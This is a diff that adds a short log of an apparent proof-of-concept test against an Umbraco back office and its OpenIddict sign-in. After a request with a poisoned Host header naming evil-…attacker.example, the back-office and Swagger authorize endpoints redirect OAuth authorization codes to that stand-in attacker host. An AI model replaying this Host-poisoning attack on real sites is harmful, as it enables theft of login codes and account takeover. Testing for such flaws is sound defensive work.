@@ -1,0 +1,9 @@
+PRE-POISON back-office authorize  -> 400  (error:invalid_request
+error_description:The specified 'redirect_uri' is not valid for this client application.
+error_uri:https://documentation.openiddict.com/errors/ID2043)
+PRE-POISON swagger authorize      -> 400  (error:invalid_request
+error_description:The specified 'redirect_uri' is not valid for this client application.
+error_uri:https://documentation.openiddict.com/errors/ID2043)
+POISON GET /umbraco Host:evil-77c658a95e.attacker.example -> 200
+POST-POISON back-office authorize -> 302  Location: http://evil-77c658a95e.attacker.example/umbraco/oauth_complete?code=%5Bredacted%5D&state=42067aa2691a&iss=http%3A%2F%2Flocalhost%3A29184%2F
+POST-POISON swagger authorize     -> 302  Location: http://evil-77c658a95e.attacker.example/umbraco/openapi/oauth2-redirect.html?code=G2Zx67KmvxClvM304l7--7xGoXPX1vq7-HcCPUt5FmQ&state=fb82138575b3&iss=http%3A%2F%2Flocalhost%3A29184%2F
